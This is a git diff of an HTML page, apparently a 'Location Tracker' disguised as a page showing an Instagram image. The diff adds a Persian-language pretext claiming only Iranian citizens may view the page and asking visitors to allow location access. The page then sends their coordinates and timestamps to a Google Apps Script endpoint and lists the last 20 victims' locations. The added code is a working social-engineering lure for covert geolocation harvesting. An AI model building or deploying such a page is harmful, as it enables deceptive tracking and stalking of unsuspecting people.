@@ -5,6 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Location Tracker</title>
     <script>
+        let locations = []; // Array to store the location data
+
+        // Display a message before asking for location
+        function promptLocationRequest() {
+            // Show a custom message
+            document.getElementById("status").innerHTML = "تنها شهروندان ایرانی مجاز به بازدید هستند، لطفا مجوز موقعیت را تایید بفرمایید";
+            // Show the button to request location
+            document.getElementById("location-button").style.display = "block";
+        }
+
+        // Trigger location fetching
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
@@ -13,6 +24,7 @@
             }
         }
 
+        // Show position and update status
         function showPosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
@@ -24,16 +36,19 @@
             // Display status message
             document.getElementById("status").innerHTML = locationUrl + " at " + time;
 
-            // Send the data to Google Sheets using a POST request
-            sendDataToGoogleSheets(latitude, longitude, time);
+            // Save to Google Sheets
+            sendDataToGoogleSheets(locationUrl, time);
+
+            // Update the table with the latest 20 locations
+            updateLocationTable();
         }
 
-        function sendDataToGoogleSheets(latitude, longitude, time) {
+        // Send location data to Google Sheets
+        function sendDataToGoogleSheets(locationUrl, time) {
             var url = 'https://script.google.com/macros/s/AKfycbxxaH54X6W7O2P32k2FqKevkf6eWhlkriO4En7-LKFNiQMz3XydfoTDcQzXqIvnjDb_Pg/exec'; // Replace with your Google Apps Script URL
 
             var data = {
-                latitude: latitude,
-                longitude: longitude,
+                locationUrl: locationUrl,
                 time: time
             };
 
@@ -47,8 +62,6 @@
             .then(response => response.text())
             .then(result => {
                 console.log("Data sent to Google Sheets:", result);
-                // After sending data, refresh the table with updated data
-                updateLocationTable();
             })
             .catch(error => {
                 console.error("Error sending data:", error);
@@ -73,7 +86,7 @@
             }
         }
 
-        // Update the table (retrieve from Google Sheets)
+        // Update the table displaying the last 20 locations
         function updateLocationTable() {
             var url = 'https://script.google.com/macros/s/AKfycbxxaH54X6W7O2P32k2FqKevkf6eWhlkriO4En7-LKFNiQMz3XydfoTDcQzXqIvnjDb_Pg/exec'; // Replace with the Google Sheets API URL to get data
             fetch(url)
@@ -82,7 +95,8 @@
                     let tableBody = document.getElementById("location-table-body");
                     tableBody.innerHTML = ''; // Clear current table contents
 
-                    locations.forEach((loc, index) => {
+                    // Show up to 20 locations
+                    locations.slice(0, 20).forEach((loc, index) => {
                         let row = tableBody.insertRow(); // Insert a new row at the end
                         row.insertCell(0).innerText = index + 1; // Row number
                         row.insertCell(1).innerText = loc.locationUrl; // Instagram link
@@ -96,19 +110,36 @@
 
         // Trigger location fetching on page load
         window.onload = function() {
-            getLocation(); // Start fetching the location
+            promptLocationRequest(); // Show the custom prompt message
             updateLocationTable(); // Update the table to show the saved locations
         };
     </script>
 </head>
 <body>
-    <h2> تصویر خصوصی از اینستاگرام</h2>
+    <h2>تصویر از اینستاگرام</h2>
+    
     <p id="status">Loading...</p>
     
+    <!-- Button to trigger location request -->
+    <button id="location-button" style="display:none;" onclick="getLocation()">Allow Location</button>
+
     <!-- Image you uploaded -->
     <img src="https://raw.githubusercontent.com/vhd10281986/location-tracker/refs/heads/main/photo_2024-11-19_14-09-32.jpg" alt="Location Image" width="400">
     
     <!-- Table to display the last 20 locations -->
-   
+    <h3>Last 20 Locations</h3>
+    <table border="1">
+        <thead>
+            <tr>
+                <th>#</th>
+                <th>Instagram Link</th>
+                <th>Time</th>
+            </tr>
+        </thead>
+        <tbody id="location-table-body">
+            <!-- Locations will be added here -->
+        </tbody>
+    </table>
+
 </body>
 </html>
